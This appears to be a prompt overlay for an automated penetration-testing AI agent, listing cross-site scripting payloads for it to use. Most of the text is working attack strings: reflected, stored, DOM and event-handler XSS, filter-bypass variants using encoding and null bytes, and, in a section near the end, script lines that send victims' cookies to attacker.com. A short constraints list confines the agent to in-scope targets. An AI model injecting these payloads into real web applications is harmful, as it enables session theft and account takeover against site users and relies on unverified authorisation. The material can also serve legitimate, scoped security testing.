# XSS — Dynamic Overlay

## Metadata
- **Exploit Type**: xss
- **Applies To**: Gamma, MCP Agent
- **Loading**: Appended when `exploit_type === "xss"`

---

## OVERLAY_CONTEXT

XSS payloads target reflected or stored user input in web applications.
Success indicators: payload reflected in response, script execution confirmed via alert/dialog, or data exfiltration via fetch.

---

## Payloads

### Reflected XSS (Baseline)
```
<script>alert(document.domain)</script>
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(document.domain)>
```

### Stored XSS (Baseline)
```
<scr<script>ipt>alert(1)</scr</script>ipt>
<div><img src=x onerror=alert(document.domain)>
```

### DOM XSS (Baseline)
```
javascript:alert(document.domain)
<img src=x onerror=alert(document.domain)>
<svg/onload=alert(location.href)>
```

### Event Handlers (Aggressive)
```
<body onload=alert(document.domain)>
<input onfocus=alert(document.domain) autofocus>
<marquee onstart=alert(document.domain)>
<select onchange=alert(document.domain)><option>1</option></select>
<object data=javascript:alert(document.domain)>
```

### Special Tags (Evasive)
```
<svg><script>alert(1)</script></svg>
<svg><img src=x onerror=alert(1)>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<details open ontoggle=alert(document.domain)>
<embed src=javascript:alert(1)>
```

---

## Vectors

| Vector | Context | Example |
|--------|---------|---------|
| URL param reflection | `?q=<payload>` | Search boxes, redirects |
| Form field reflection | POST body | Feedback, comment fields |
| Header injection | `User-Agent`, `Referer` | Rare but exploitable |
| DOM manipulation | `location.hash` | SPA URL params |
| Cookie reflection | Document.cookie | Rare, usually httponly |

---

## Bypasses

### Case Normalization (WAF blocks `<script>`)
```
<ScRiPt>alert(1)</sCrIpT>
<img src=x oNeRrOr=alert(1)>
```

### HTML Entity Encoding
```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
```

### Unicode Normalization
```
<script>\u0061lert(1)</script>
```

### Null Byte Injection
```
<script>alert\x00(1)</script>
```

### Nested Tags
```
<scr\x00ipt>alert(1)</script>
```

### Protocol-relative URL
```
<img src="//evil.com/x.png">
```

---

## Data Exfiltration Payloads

```
<script>fetch('http://attacker.com/log?c='+document.cookie)</script>
<script>new Image().src='http://attacker.com/?c='+btoa(document.cookie)</script>
<script>fetch('http://attacker.com/?d='+encodeURIComponent(document.domain))</script>
```

---

## Constraints

```
- NEVER attempt XSS on out-of-scope URLs
- NEVER usealert(1) in real engagements — use confirm() or location.href for confirmation
- For DOM XSS: always verify the sink (eval, innerHTML, document.write) before payload selection
- Stored XSS requires two requests: inject, then trigger (visit page)
```

---

*Overlay version: 1.0*
